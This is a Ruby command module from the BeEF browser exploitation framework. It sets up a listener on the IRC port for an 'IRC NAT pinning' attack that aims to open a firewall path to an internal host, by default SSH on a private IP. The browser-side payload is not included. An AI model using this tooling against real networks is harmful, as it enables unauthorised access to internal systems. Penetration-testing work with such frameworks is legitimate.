#
# Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
class Irc_nat_pinning < BeEF::Core::Command

  def pre_send
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind_socket("IRC", "0.0.0.0", 6667)
  end

  def self.options
    @configuration = BeEF::Core::Configuration.instance
    beef_host = @configuration.get("beef.http.public") || @configuration.get("beef.http.host")

    return [
        {'name'=>'connectto', 'ui_label' =>'Connect to','value'=>beef_host},
        {'name'=>'privateip', 'ui_label' =>'Private IP','value'=>'192.168.0.100'},
        {'name'=>'privateport', 'ui_label' =>'Private Port','value'=>'22'}
    ]
  end
  
  def post_execute
    return if @datastore['result'].nil?
    save({'result' => @datastore['result']})

    # wait 30 seconds before unbinding the socket. The HTTP connection will arrive sooner than that anyway.
    sleep 30
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind_socket("IRC")

  end
  
end
